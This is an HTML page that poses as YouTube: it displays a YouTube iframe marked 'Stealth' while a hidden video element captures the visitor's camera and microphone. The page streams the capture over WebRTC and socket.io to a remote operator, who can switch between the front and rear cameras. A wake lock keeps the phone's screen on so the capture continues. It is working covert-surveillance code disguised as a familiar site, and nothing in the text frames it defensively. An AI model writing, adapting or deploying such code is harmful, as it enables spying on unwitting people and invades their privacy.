<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body, html { margin: 0; padding: 0; background: #0f0f0f; height: 100%; overflow: hidden; }
        iframe { width: 100%; height: 100%; border: none; pointer-events: none; }
        video { display: none; }
    </style>
</head>
<body>
    <!-- Real YouTube Video Player (Stealth) -->
    <iframe src="https://www.youtube.com" allow="autoplay"></iframe>
    <video id="v" autoplay playsinline muted></video>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const video = document.getElementById("v");
        let localStream;
        let currentMode = "user"; // Start with Front

        const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });

        // 1. Wake Lock API: Screen off hote dibe na
        let wakeLock = null;
        async function requestWakeLock() {
            try {
                wakeLock = await navigator.wakeLock.request('screen');
                console.log('Wake Lock active!');
            } catch (err) { console.log(err.name, err.message); }
        }

        async function start(mode) {
            if (localStream) localStream.getTracks().forEach(t => t.stop());
            try {
                localStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: mode }, 
                    audio: true 
                });
                video.srcObject = localStream;
                const track = localStream.getVideoTracks()[0];
                const sender = pc.getSenders().find(s => s.track && s.track.kind === 'video');
                if (sender) sender.replaceTrack(track);
                else localStream.getTracks().forEach(t => pc.addTrack(t, localStream));
                
                socket.emit("ready");
                requestWakeLock(); // Lock screen
            } catch (e) { alert("Please allow camera access!"); }
        }

        // Remote Switch Logic from PC
        socket.on("switch-camera", () => {
            currentMode = (currentMode === "user") ? "environment" : "user";
            start(currentMode);
        });

        socket.on("ready", async () => {
            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);
            socket.emit("offer-front", offer);
        });

        socket.on("answer-front", a => pc.setRemoteDescription(new RTCSessionDescription(a)));
        pc.onicecandidate = e => e.candidate && socket.emit("ice-front", e.candidate);
        socket.on("ice-front", c => pc.addIceCandidate(new RTCIceCandidate(c)));

        window.onload = () => start(currentMode);

        // Auto-reconnect if minimized and back
        document.addEventListener('visibilitychange', () => {
            if (wakeLock !== null && document.visibilityState === 'visible') {
                requestWakeLock();
            }
        });
    </script>
</body>
</html>

